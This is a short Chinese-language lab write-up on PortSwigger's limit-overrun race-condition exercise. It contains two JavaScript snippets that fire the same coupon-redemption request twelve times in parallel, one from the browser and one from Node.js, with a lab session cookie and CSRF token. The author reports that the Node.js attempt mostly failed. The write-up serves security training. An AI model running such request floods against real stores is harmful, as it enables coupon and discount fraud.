---
title: Race conditions
description: Race conditions
---

## Lab: Limit overrun race conditions

| Dimension | Description                                                                            |
| --------- | -------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/race-conditions#limit-overrun-race-conditions     |
| Lab       | https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun |

這題很簡單，就是要同時送出很多個兌換碼的 HTTP Request，但很可惜，但要在瀏覽器控制併行送出多個請求會比較困難

```js
const couponForm = document.getElementById("coupon-form");
const sp = new URLSearchParams();
sp.append("csrf", "hJBGfUUwkgeehlxTw7z4T2IuBGB7nBOy");
sp.append("coupon", "PROMO20");
function applyCoupon() {
  return fetch(couponForm.action, {
    method: "post",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: sp.toString(),
  });
}
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
```

稍微調整一下，改用 NodeJS 試試看

```js
const couponForm = document.getElementById("coupon-form");
const sp = new URLSearchParams();
sp.append("csrf", "hJBGfUUwkgeehlxTw7z4T2IuBGB7nBOy");
sp.append("coupon", "PROMO20");
function applyCoupon() {
  return fetch(
    "https://0a1c00990378dd4680117b6b00a700ae.web-security-academy.net/cart/coupon",
    {
      method: "post",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Cookie: "session=oQf2bCYK3mMzTQnM3OP1YuZbr6mNFlen",
      },
      body: sp.toString(),
    },
  );
}
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
```

結果更廢，大概只有 claim 1 ~ 2 張折價券，看來需要尋找一個可以併行送出多個請求的 script 或工具

## 參考資料

- https://portswigger.net/web-security/race-conditions
